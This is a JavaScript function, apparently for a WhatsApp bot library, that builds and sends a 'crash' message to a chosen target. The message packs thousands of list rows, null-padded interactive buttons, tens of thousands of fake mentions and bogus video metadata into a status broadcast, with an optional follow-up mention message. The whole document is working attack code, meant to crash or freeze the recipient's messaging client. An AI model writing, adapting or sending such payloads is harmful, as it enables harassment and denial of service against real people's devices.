async function megaCrashFusion(target, enableMention) {
    const overButton = Array.from({ length: 9696 }, (_, r) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const extremeNativeFlowButtons = [
        { name: "single_select", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_url", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_call", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_copy", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_reminder", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "cta_cancel_reminder", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "address_message", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "send_location", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "quick_reply", buttonParamsJson: "\u0000".repeat(90000) },
        { name: "mpm", buttonParamsJson: "\u0000".repeat(90000) },
    ];

    const combinedViewOncePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "꓄ꍏꀘꍏ",
                    listType: 2,
                    buttonText: null,
                    sections: overButton,
                    singleSelectReply: { selectedRowId: "🪅" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9696 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----default"
                        },
                        interactiveAnnotations: extremeNativeFlowButtons
                    },
                    description: "default"
                },
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "鈳� 饾悈 饾悽蜏廷蜖虌汀汀谈谭谭谭蜏廷 饾悕 饾悎 饾悧蜏廷-鈥�",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "kontol",
                                songId: "peler",
                                author: ".Tama Ryuichi",
                                title: "Finix",
                                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                countryBlocklist: true,
                                isExplicit: true,
                                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                            }
                        }
                    }]
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const fused = generateWAMessageFromContent(target, combinedViewOncePayload, {});

    await Zeph.relayMessage("status@broadcast", fused.message, {
        messageId: fused.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    if (enableMention) {
        await Zeph.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: fused.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}